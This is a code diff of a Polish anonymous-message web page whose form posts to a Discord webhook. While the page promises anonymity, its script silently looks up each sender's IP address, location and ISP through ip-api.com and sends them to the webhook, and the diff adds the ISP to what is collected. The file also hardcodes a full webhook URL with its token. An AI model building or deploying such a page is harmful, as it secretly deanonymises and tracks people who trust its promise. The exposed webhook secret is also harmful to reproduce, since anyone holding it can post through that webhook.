@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Anonimowa Wiadomość</title>
+    <title>Anonimowa Wiadomość v2</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <script>
         tailwind.config = {
             theme: {
@@ -14,8 +15,44 @@
                     },
                     colors: {
                         discordPurple: '#5865F2',
-                        discordDark: '#2C2F33',
+                        discordDark: '#23272A', // Darker background
+                        discordDarker: '#1e2124', // Even darker for elements
                         discordLight: '#99AAB5',
+                        discordGreen: '#43B581',
+                        discordRed: '#F04747',
+                        brandPurple: { // Custom purple palette
+                            light: '#7B61FF',
+                            DEFAULT: '#5865F2',
+                            dark: '#4752C4',
+                        }
+                    },
+                    animation: {
+                        'bounce-slow': 'bounce-slow 3s infinite',
+                        'pulse-subtle': 'pulse-subtle 2.5s infinite ease-in-out',
+                        'slide-in-up': 'slide-in-up 0.5s ease-out forwards',
+                        'fade-in': 'fade-in 0.5s ease-out forwards',
+                    },
+                    keyframes: {
+                        'bounce-slow': {
+                            '0%, 100%': { transform: 'translateY(-6%)', animationTimingFunction: 'cubic-bezier(0.8,0,1,1)' },
+                            '50%': { transform: 'translateY(0)', animationTimingFunction: 'cubic-bezier(0,0,0.2,1)' },
+                        },
+                        'pulse-subtle': {
+                            '0%, 100%': { opacity: '1' },
+                            '50%': { opacity: '0.85' },
+                        },
+                        'slide-in-up': {
+                            '0%': { opacity: '0', transform: 'translateY(20px)' },
+                            '100%': { opacity: '1', transform: 'translateY(0)' },
+                        },
+                        'fade-in': {
+                            '0%': { opacity: '0' },
+                            '100%': { opacity: '1' },
+                        }
+                    },
+                    boxShadow: {
+                        'glow-purple': '0 0 15px 5px rgba(88, 101, 242, 0.4)',
+                        'glow-purple-light': '0 0 10px 2px rgba(123, 97, 255, 0.3)',
                     }
                 }
             }
@@ -24,143 +61,159 @@
     <style>
         body {
             font-family: 'Inter', sans-serif;
+            background-color: #23272A; /* discordDark */
         }
         /* Custom scrollbar for textarea */
         textarea::-webkit-scrollbar {
-            width: 8px;
+            width: 10px;
         }
         textarea::-webkit-scrollbar-track {
-            background: #f1f1f1;
+            background: #2C2F33; /* discordDark */
             border-radius: 10px;
         }
         textarea::-webkit-scrollbar-thumb {
-            background: #888;
+            background: #5865F2; /* discordPurple */
             border-radius: 10px;
+            border: 2px solid #2C2F33; /* discordDark */
         }
         textarea::-webkit-scrollbar-thumb:hover {
-            background: #555;
+            background: #4752C4; /* brandPurple.dark */
         }
-        /* Simple bounce animation */
-        @keyframes bounce-slow {
-            0%, 100% {
-                transform: translateY(-5%);
-                animation-timing-function: cubic-bezier(0.8, 0, 1, 1);
-            }
-            50% {
-                transform: translateY(0);
-                animation-timing-function: cubic-bezier(0, 0, 0.2, 1);
-            }
+
+        .glassmorphism {
+            background: rgba(44, 47, 51, 0.6); /* discordDark with opacity */
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
-        .animate-bounce-slow {
-            animation: bounce-slow 2s infinite;
+
+        .button-cooldown {
+            background-color: #72767d !important; /* Discord grey */
+            cursor: not-allowed !important;
         }
     </style>
 </head>
-<body class="bg-gradient-to-br from-discordPurple to-purple-800 min-h-screen flex items-center justify-center p-4">
-    <div class="bg-white p-6 sm:p-8 rounded-2xl shadow-2xl w-full max-w-md transform transition-all duration-300 hover:scale-[1.01]">
-        <div class="text-center mb-8">
-            <svg class="mx-auto h-16 w-16 text-discordPurple animate-bounce-slow" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                <path d="M19.73 5.48C18.63 4.25 16.92 3.5 15 3.5c-1.92 0-3.63.75-4.73 1.98-1.1 1.23-1.67 2.87-1.67 4.52 0 1.65.57 3.29 1.67 4.52 1.1 1.23 2.81 1.98 4.73 1.98 1.92 0 3.63-.75 4.73-1.98 1.1-1.23 1.67-2.87 1.67-4.52 0-1.65-.57-3.29-1.67-4.52zm-4.73 9.52c-1.1 0-2.07-.4-2.73-1.07-.66-.67-1.07-1.63-1.07-2.73s.4-2.07 1.07-2.73c.66-.67 1.63-1.07 2.73-1.07s2.07.4 2.73 1.07c.66.67 1.07 1.63 1.07 2.73s-.4 2.07-1.07 2.73c-.66.67-1.63 1.07-2.73 1.07z"/>
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/>
+<body class="min-h-screen flex items-center justify-center p-4 bg-gradient-to-br from-discordDark via-discordDarker to-black">
+    <div class="glassmorphism p-6 sm:p-10 rounded-2xl shadow-2xl w-full max-w-lg transform transition-all duration-500 hover:scale-[1.02] hover:shadow-glow-purple">
+        <div class="text-center mb-8 animate-fade-in">
+            <svg class="mx-auto h-20 w-20 text-brandPurple-light animate-bounce-slow" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M12 2C6.477 2 2 6.477 2 12C2 17.523 6.477 22 12 22C17.523 22 22 17.523 22 12C22 6.477 17.523 2 12 2ZM11.293 7.293C11.683 6.902 12.317 6.902 12.707 7.293L16.707 11.293C17.098 11.683 17.098 12.317 16.707 12.707L12.707 16.707C12.317 17.098 11.683 17.098 11.293 16.707L7.293 12.707C6.902 12.317 6.902 11.683 7.293 11.293L11.293 7.293ZM12 10C11.448 10 11 10.448 11 11V13C11 13.552 11.448 14 12 14C12.552 14 13 13.552 13 13V11C13 10.448 12.552 10 12 10ZM12 15C11.448 15 11 15.448 11 16C11 16.552 11.448 17 12 17C12.552 17 13 16.552 13 16C13 15.448 12.552 15 12 15Z"/>
             </svg>
-            <h1 class="text-4xl font-extrabold text-gray-800 mt-4">Anonimowa Wiadomość</h1>
-            <p class="text-gray-600 mt-2 text-lg">Wyślij anonimową wiadomość do Stop Chakerom</p>
+            <h1 class="text-4xl sm:text-5xl font-extrabold text-white mt-6">Anonimowa Skrzynka</h1>
+            <p class="text-discordLight mt-3 text-lg">Wyślij anonimową wiadomość do <span class="font-semibold text-brandPurple-light">Stop Chakerom</span></p>
         </div>
 
-        <form id="webhookForm" class="space-y-6">
+        <form id="webhookForm" class="space-y-7 animate-slide-in-up" style="animation-delay: 0.2s;">
             <div>
-                <label for="messageContent" class="block text-base font-medium text-gray-700 mb-2">Twoja Wiadomość:</label>
+                <label for="messageContent" class="block text-base font-medium text-discordLight mb-2">Twoja Wiadomość:</label>
                 <textarea
                     id="messageContent"
                     name="messageContent"
-                    rows="7"
-                    placeholder="Wpisz swoją anonimową wiadomość tutaj..."
+                    rows="8"
+                    placeholder="Wpisz swoją anonimową wiadomość tutaj... Bądź kreatywny!"
                     required
-                    class="block w-full px-4 py-3 border border-gray-300 rounded-xl shadow-sm focus:ring-discordPurple focus:border-discordPurple sm:text-base resize-y transition duration-200 ease-in-out transform focus:scale-[1.01]"
+                    class="block w-full px-4 py-3 bg-discordDarker border border-gray-700 rounded-xl shadow-sm text-gray-200 placeholder-gray-500 focus:ring-2 focus:ring-brandPurple focus:border-brandPurple sm:text-base resize-y transition duration-200 ease-in-out transform focus:scale-[1.01] focus:shadow-glow-purple-light"
                 ></textarea>
             </div>
 
             <button
+                id="submitButton"
                 type="submit"
-                class="w-full flex justify-center py-3 px-4 border border-transparent rounded-xl shadow-lg text-xl font-semibold text-white bg-discordPurple hover:bg-blue-700 focus:outline-none focus:ring-3 focus:ring-offset-2 focus:ring-discordPurple transition duration-200 ease-in-out transform hover:scale-105 active:scale-95"
+                class="w-full flex justify-center items-center py-3.5 px-4 border border-transparent rounded-xl shadow-lg text-xl font-semibold text-white bg-brandPurple hover:bg-brandPurple-dark focus:outline-none focus:ring-3 focus:ring-offset-2 focus:ring-offset-discordDarker focus:ring-brandPurple transition-all duration-200 ease-in-out transform hover:scale-105 active:scale-95 group"
             >
-                <svg class="w-6 h-6 mr-2 -ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"></path></svg>
-                Wyślij Anonimowo
+                <svg class="w-6 h-6 mr-2.5 -ml-1 group-hover:rotate-[10deg] transition-transform duration-300" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"></path></svg>
+                <span id="buttonText">Wyślij Anonimowo</span>
             </button>
         </form>
 
-        <div id="messageStatus" class="mt-8 p-5 rounded-xl text-center text-lg font-medium hidden transition-all duration-300 ease-in-out">
+        <div id="messageStatus" class="mt-8 p-5 rounded-xl text-center text-lg font-medium opacity-0 transition-all duration-500 ease-in-out max-h-0 overflow-hidden">
             </div>
     </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            // Hardcoded Discord Webhook URL
+            // Hardcoded Discord Webhook URL - IMPORTANT: Keep this secure and consider environment variables for production
             const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1376649264763240569/N55yq2-Sc3SaKZQft2VBNnHvBR-umGQAdHoiMzBTxcruhON5NvSdr0gp5t1nKazzWk5Q";
 
             const webhookForm = document.getElementById('webhookForm');
             const messageContentInput = document.getElementById('messageContent');
             const messageStatusDiv = document.getElementById('messageStatus');
+            const submitButton = document.getElementById('submitButton');
+            const buttonText = document.getElementById('buttonText');
+
+            let isSubmitting = false;
+            const COOLDOWN_SECONDS = 10;
 
             webhookForm.addEventListener('submit', async (event) => {
-                event.preventDefault(); // Zapobiegaj domyślnej wysyłce formularza
+                event.preventDefault();
 
-                const messageContent = messageContentInput.value.trim();
-
-                // Wyczyść poprzedni status i ukryj
-                messageStatusDiv.classList.add('hidden');
-                messageStatusDiv.classList.remove('bg-green-100', 'text-green-800', 'bg-red-100', 'text-red-800', 'bg-blue-100', 'text-blue-800');
-                messageStatusDiv.textContent = ''; // Wyczyść tekst wiadomości
-
-                if (!messageContent) {
-                    displayStatus('Proszę wpisać treść wiadomości.', 'error');
+                if (isSubmitting) {
+                    displayStatus('Proszę poczekać przed wysłaniem kolejnej wiadomości.', 'info', 3000);
                     return;
                 }
 
-                let ipAddress = 'Nieznany';
-                let region = 'Nieznany';
+                const messageContent = messageContentInput.value.trim();
+
+                // Clear previous status and hide
+                hideStatus();
+
+                if (!messageContent) {
+                    displayStatus('Proszę wpisać treść wiadomości.', 'error', 3000);
+                    return;
+                }
+
+                setButtonCooldown(true, 'Wysyłanie...');
+
+                let ipAddress = 'Informacje niedostępne';
+                let region = 'Informacje niedostępne';
+                let isp = 'Informacje niedostępne';
 
                 try {
-                    // Pobierz dane IP i regionu
-                    const ipResponse = await fetch('https://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
+                    // Fetch IP and region data
+                    const ipResponse = await fetch('https://ip-api.com/json/?fields=status,message,country,regionName,city,query,isp,org');
                     const ipData = await ipResponse.json();
 
                     if (ipData.status === 'success') {
                         ipAddress = ipData.query || 'Brak IP';
                         region = `${ipData.city || 'Nieznane Miasto'}, ${ipData.regionName || 'Nieznany Region'}, ${ipData.country || 'Nieznany Kraj'}`;
+                        isp = ipData.isp || (ipData.org || 'Nieznany ISP');
                     } else {
                         console.warn('Nie udało się pobrać danych IP/regionu:', ipData.message);
-                        ipAddress = 'Błąd pobierania IP';
-                        region = 'Błąd pobierania regionu';
                     }
                 } catch (error) {
                     console.error('Błąd podczas pobierania danych IP/regionu:', error);
-                    ipAddress = 'Błąd sieci IP';
-                    region = 'Błąd sieci regionu';
                 }
 
                 const payload = {
-                    username: "Anonimowy Nadawca", // Nazwa użytkownika, która pojawi się na Discordzie
-                    avatar_url: "https://placehold.co/64x64/5865F2/FFFFFF?text=Anon", // Anonimowy awatar
+                    username: "Anonimowy Posłaniec", // Updated username
+                    avatar_url: "https://placehold.co/128x128/5865F2/FFFFFF?text=ANON&font=inter", // Updated avatar
                     embeds: [
                         {
-                            description: `**Treść wiadomości:**\n${messageContent}`,
-                            color: 5793266, // Kolor podobny do Discorda
+                            title: "🔒 Nowa Anonimowa Wiadomość",
+                            description: `**Treść wiadomości:**\n>>> ${messageContent}`, // Markdown for blockquote
+                            color: parseInt("5865F2", 16), // Discord purple in decimal
                             fields: [
                                 {
-                                    name: "Adres IP",
-                                    value: `\`${ipAddress}\``, // Wyświetl IP jako kod dla czytelności
+                                    name: "🕵️ Adres IP Nadawcy",
+                                    value: `\`${ipAddress}\``,
                                     inline: true
                                 },
                                 {
-                                    name: "Region",
+                                    name: "🌍 Przybliżony Region",
                                     value: region,
                                     inline: true
+                                },
+                                {
+                                    name: "📡 ISP/Organizacja",
+                                    value: isp,
+                                    inline: false // Full width for better readability
                                 }
                             ],
                             footer: {
-                                text: `Wysłano: ${new Date().toLocaleString('pl-PL')}`
-                            }
+                                text: `Wysłano: ${new Date().toLocaleString('pl-PL', { dateStyle: 'long', timeStyle: 'medium' })}`,
+                                icon_url: "https://placehold.co/32x32/FFFFFF/000000?text=🕰️" // Clock icon
+                            },
+                            timestamp: new Date().toISOString()
                         }
                     ]
                 };
@@ -175,44 +228,93 @@
                     });
 
                     if (response.ok) {
-                        displayStatus('Wiadomość została wysłana anonimowo!', 'success');
-                        messageContentInput.value = ''; // Wyczyść pole wiadomości po sukcesie
+                        displayStatus('Wiadomość została wysłana anonimowo! 🎉', 'success');
+                        messageContentInput.value = ''; // Clear message field on success
+                        startCooldownTimer();
                     } else {
-                        // Próba sparsowania danych błędu z odpowiedzi webhooka Discorda
-                        let errorMessage = `Błąd (${response.status}): ${response.statusText}`;
+                        let errorMessage = `Błąd serwera Discord (${response.status}): ${response.statusText}`;
                         try {
                             const errorData = await response.json();
                             if (errorData && errorData.message) {
                                 errorMessage = `Błąd Discorda: ${errorData.message}`;
+                                if (errorData.errors) { // More detailed errors if available
+                                    errorMessage += `\nSzczegóły: ${JSON.stringify(errorData.errors)}`;
+                                }
                             }
                         } catch (jsonError) {
                             console.error('Nie udało się sparsować błędu JSON z Discorda:', jsonError);
                         }
                         displayStatus(errorMessage, 'error');
+                        setButtonCooldown(false); // Re-enable button on Discord error
                     }
                 } catch (error) {
                     console.error('Błąd sieci lub serwera Discorda:', error);
                     displayStatus('Wystąpił błąd sieci. Sprawdź połączenie lub adres URL webhooka.', 'error');
+                    setButtonCooldown(false); // Re-enable button on network error
                 }
             });
 
-            function displayStatus(message, type) {
+            function setButtonCooldown(isCoolingDown, text = 'Wyślij Anonimowo') {
+                isSubmitting = isCoolingDown;
+                submitButton.disabled = isCoolingDown;
+                buttonText.textContent = text;
+                if (isCoolingDown) {
+                    submitButton.classList.add('button-cooldown');
+                } else {
+                    submitButton.classList.remove('button-cooldown');
+                }
+            }
+
+            function startCooldownTimer() {
+                let secondsRemaining = COOLDOWN_SECONDS;
+                setButtonCooldown(true, `Poczekaj ${secondsRemaining}s...`);
+
+                const interval = setInterval(() => {
+                    secondsRemaining--;
+                    if (secondsRemaining > 0) {
+                        buttonText.textContent = `Poczekaj ${secondsRemaining}s...`;
+                    } else {
+                        clearInterval(interval);
+                        setButtonCooldown(false, 'Wyślij Anonimowo');
+                    }
+                }, 1000);
+            }
+
+            function displayStatus(message, type, autoHideDelay = 0) {
                 messageStatusDiv.textContent = message;
-                messageStatusDiv.classList.remove('hidden', 'bg-green-100', 'text-green-800', 'bg-red-100', 'text-red-800', 'bg-blue-100', 'text-blue-800');
+                // Reset classes
+                messageStatusDiv.className = 'mt-8 p-5 rounded-xl text-center text-lg font-medium transition-all duration-500 ease-in-out';
                 
                 if (type === 'success') {
-                    messageStatusDiv.classList.add('bg-green-100', 'text-green-800');
+                    messageStatusDiv.classList.add('bg-discordGreen', 'text-white');
                 } else if (type === 'error') {
-                    messageStatusDiv.classList.add('bg-red-100', 'text-red-800');
-                } else if (type === 'info') { // 'info' type is still available but not used for IP fetching
-                    messageStatusDiv.classList.add('bg-blue-100', 'text-blue-800');
+                    messageStatusDiv.classList.add('bg-discordRed', 'text-white');
+                } else if (type === 'info') { 
+                    messageStatusDiv.classList.add('bg-brandPurple', 'text-white');
                 }
 
-                messageStatusDiv.classList.add('opacity-0'); // Rozpocznij z przezroczystością 0 dla przejścia
-                setTimeout(() => {
-                    messageStatusDiv.classList.add('opacity-100'); // Stopniowe pojawianie się
-                }, 10); // Małe opóźnienie, aby upewnić się, że przejście zadziała
+                // Animate in
+                messageStatusDiv.style.maxHeight = messageStatusDiv.scrollHeight + "px";
+                messageStatusDiv.style.opacity = '1';
+                messageStatusDiv.style.marginTop = '2rem'; // Ensure margin is applied
+
+                if (autoHideDelay > 0) {
+                    setTimeout(hideStatus, autoHideDelay);
+                }
             }
+
+            function hideStatus() {
+                messageStatusDiv.style.opacity = '0';
+                messageStatusDiv.style.maxHeight = '0';
+                messageStatusDiv.style.marginTop = '0'; // Collapse margin
+            }
+
+            // Initial animation for the form elements
+            const formElements = document.querySelectorAll('#webhookForm > div, #webhookForm > button');
+            formElements.forEach((el, index) => {
+                el.classList.add('opacity-0', 'animate-slide-in-up');
+                el.style.animationDelay = `${0.2 + index * 0.1}s`;
+            });
         });
     </script>
 </body>
